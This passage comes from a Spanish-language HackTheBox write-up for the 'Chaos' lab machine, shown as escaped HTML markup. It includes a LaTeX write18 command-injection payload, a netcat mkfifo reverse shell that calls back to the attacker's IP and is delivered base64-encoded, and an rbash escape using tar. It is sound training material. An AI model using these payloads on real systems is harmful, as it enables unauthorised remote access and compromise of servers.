&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;random&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;Crypto.Cipher&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;AES&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;Crypto.Hash&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SHA256&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;decrypt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;filename&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;chunksize&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;64&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1024&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;outputFile&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;dec&amp;#39;&lt;/span&gt;
	
	&lt;span class=&#34;k&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;filename&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;rb&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;infile&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
		&lt;span class=&#34;n&#34;&gt;filesize&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;long&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;infile&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
		&lt;span class=&#34;n&#34;&gt;IV&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;infile&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

		&lt;span class=&#34;n&#34;&gt;decryptor&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;AES&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;AES&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;MODE_CBC&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;IV&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

		&lt;span class=&#34;k&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;outputFile&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;wb&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;outfile&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
			&lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;bp&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
				&lt;span class=&#34;n&#34;&gt;chunk&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;infile&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;chunksize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
				&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;chunk&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
					&lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;

				&lt;span class=&#34;n&#34;&gt;outfile&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;decryptor&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;decrypt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;chunk&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
			&lt;span class=&#34;n&#34;&gt;outfile&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;truncate&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;filesize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;


&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;getKey&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;hasher&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SHA256&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;new&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;hasher&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;digest&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;Main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;filename&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;/path/to/file/file_enc&amp;#39;&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;password&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;sahay&amp;#39;&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;decrypt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;getKey&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;filename&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Done.&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	
&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;vm&#34;&gt;__name__&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;Main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Al ejecutar nuestro escript nos muestra un mensaje en base64 este mismo lo decodificamos y nos muestra un segundo mensaje que nos habla de un servicio de pdf y una url donde este se encuentra.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/chaos/Screenshot_20190523_142646.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-vim&#34; data-lang=&#34;vim&#34;&gt;&lt;span class=&#34;nx&#34;&gt;Hii&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Sahay&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Please&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;check&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;our&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;service&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;which&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;create&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;pdf&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;p&lt;/span&gt;.&lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;As&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;you&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;told&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;me&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;encrypt&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;important&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;msg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;did&lt;/span&gt; :&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;http&lt;/span&gt;:&lt;span class=&#34;sr&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;chaos&lt;/span&gt;.&lt;span class=&#34;nx&#34;&gt;htb&lt;/span&gt;/&lt;span class=&#34;nx&#34;&gt;J00_w1ll_f1Nd_n07H1n9_H3r3&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Thanks&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Ayush&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Agregamos el nuevo dominio a nuestro archivo &lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;[/etc/hosts]&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-vim&#34; data-lang=&#34;vim&#34;&gt;&lt;span class=&#34;m&#34;&gt;10&lt;/span&gt;.&lt;span class=&#34;m&#34;&gt;10&lt;/span&gt;.&lt;span class=&#34;m&#34;&gt;10&lt;/span&gt;.&lt;span class=&#34;m&#34;&gt;120&lt;/span&gt;	&lt;span class=&#34;nx&#34;&gt;chaos&lt;/span&gt;.&lt;span class=&#34;nx&#34;&gt;htb&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;rce---pdftext-latex&#34;&gt;RCE - pdfTEXT [LaTex]&lt;/h2&gt;
&lt;p&gt;Al visitar la url del mensaje nos muestra lo que parece ser un servicio de creacion de PDF, al enviar un texto con el Template test1 nos muestra en la parte de respuesta en este caso en el METODO POST, la version de &lt;code&gt;pdfTEXT&lt;/code&gt;. Investigamos un poco acerca de este servicio y encontramos un post que habla de una vulnerabilidad en los compiladores basados en &lt;code&gt;LaTex&lt;/code&gt;, en el cual se pueden ejecutar comandos en el servidor donde este corriendo un servicio basado en este.&lt;/p&gt;
&lt;p&gt;INFO =&amp;gt; &lt;a href=&#34;https://0day.work/hacking-with-latex/&#34;&gt;https://0day.work/hacking-with-latex/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos el siguiente payload y un comando para comprobar que estos se ejecutan en la maquina, se envio por medio del Template &lt;code&gt;test3&lt;/code&gt;:&lt;/p&gt;
&lt;p&gt;Payload:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-vim&#34; data-lang=&#34;vim&#34;&gt;\&lt;span class=&#34;nx&#34;&gt;immediate&lt;/span&gt;\&lt;span class=&#34;nx&#34;&gt;write18&lt;/span&gt;{#&lt;span class=&#34;nx&#34;&gt;ComandoAqui&lt;/span&gt;}&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Comando:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;nslookup sckull.htb 10.10.13.27
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Responder:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/chaos/Screenshot_20190523_150504.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ahora que tenemos un &amp;lsquo;pequeño&amp;rsquo; acceso mediante ejecucion de comandos, vamos a descargar un archivo que contiene una shell inversa para ejecutarlo y obtener acceso.&lt;/p&gt;
&lt;p&gt;Shell:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;rm /tmp/f&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;mkfifo /tmp/f&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;cat /tmp/f&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;/bin/sh -i 2&amp;gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;1&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;nc 10.10.13.27 &lt;span class=&#34;m&#34;&gt;7878&lt;/span&gt; &amp;gt;/tmp/f
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Codificamos a base64:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTMuMjcgNzg3OCA+L3RtcC9mCg&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Payload:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-vim&#34; data-lang=&#34;vim&#34;&gt;\&lt;span class=&#34;nx&#34;&gt;immediate&lt;/span&gt;\&lt;span class=&#34;nx&#34;&gt;write18&lt;/span&gt;{&lt;span class=&#34;nx&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;JjF8bmMgMTAuMTAuMTMuMjcgNzg3OCA&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;L3RtcC9mCg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;==|&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;base64&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;d&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;shell&lt;/span&gt;.&lt;span class=&#34;nx&#34;&gt;sh&lt;/span&gt; &amp;amp;&amp;amp; &lt;span class=&#34;nx&#34;&gt;sh&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;shell&lt;/span&gt;.&lt;span class=&#34;nx&#34;&gt;sh&lt;/span&gt;}&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Al enviar este mensaje la maquina decodifica nuestra shell y la agrega a un archivo (&lt;code&gt;shell.sh&lt;/code&gt;) luego de esto la ejecuta y obtenemos nuestra shell como usuario &lt;code&gt;www-data&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/chaos/Screenshot_20190523_151537.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Actualizamos nuestra shell con python, al intentar ingresar al directorio de ayush nos dice permiso denegado, anteriormente encontramos una contraseña para &lt;code&gt;ayush&lt;/code&gt; utilizamos la misma para poder escalar a ese usuario mediante el comando &lt;code&gt;su&lt;/code&gt;, pero al intentar ingresar a su carpeta principal nos muestra que cd esta restringido.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/chaos/Screenshot_20190523_151821.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Para poder escapar este mensaje o rbash utilizamos &lt;code&gt;tar&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;tar cf /dev/null testfile --checkpoint&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; --checkpoint-action&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Tambien agregamos a la variable &lt;code&gt;PATH&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;PATH&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/usr/bin:/bin
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Al realizar todo esto podemos ingresar a la carpeta de ayush y obtener nuestra bandera &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/chaos/Screenshot_20190523_152137_user.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Hicimos una pequeña enumeracion en los directorios de ayus y encontramos una carpeta de &lt;code&gt;.mozilla&lt;/code&gt; que pertenece a el navegador &lt;code&gt;firefox&lt;/code&gt;, revisamos los archivos que contiene esta carpeta y encontramos el archivo &lt;code&gt;login.json&lt;/code&gt; que almacena las contraseñas de firefox.&lt;/p&gt;
